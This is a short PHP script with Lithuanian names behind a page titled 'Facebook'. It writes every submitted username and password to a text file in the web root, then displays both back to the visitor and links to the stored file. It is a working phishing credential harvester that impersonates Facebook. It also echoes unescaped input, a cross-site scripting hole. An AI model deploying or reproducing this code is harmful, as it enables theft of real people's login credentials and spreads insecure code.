<?php
$failoVieta = $_SERVER['DOCUMENT_ROOT']."\Duomenys.txt";
$failas = fopen($failoVieta, "a");
if($failas === FALSE)
{
    echo "Nepavyko atidaryti failo rašymui";
}
else
{
    fwrite($failas, "Parodomas prisijungimo vardas ir slaptazodis:".",");
    fwrite($failas, $_POST['Vardas'].",");
    fwrite($failas, $_POST['Slaptazodis']."\r\n");
    fclose($failas);
}
?>
<html>
    <head>
        <title>Facebook</title>
        <meta charset="utf-8" />
    </head>
    <body>
        <?php
        $vardas = $_POST['Vardas'];
        if($vardas == "Rokas") 
        {
            echo "Labas, Rokai";
        }
        else
        {
            echo "Labas, " . $vardas;
        }
        ?>
        <br>
        Slaptazodis: 
        <?=$_POST['Slaptazodis'] ?>
        <br>
        <a href="\Duomenys.txt" />Daugiau informacijos</a>
    </body>
</html>




        
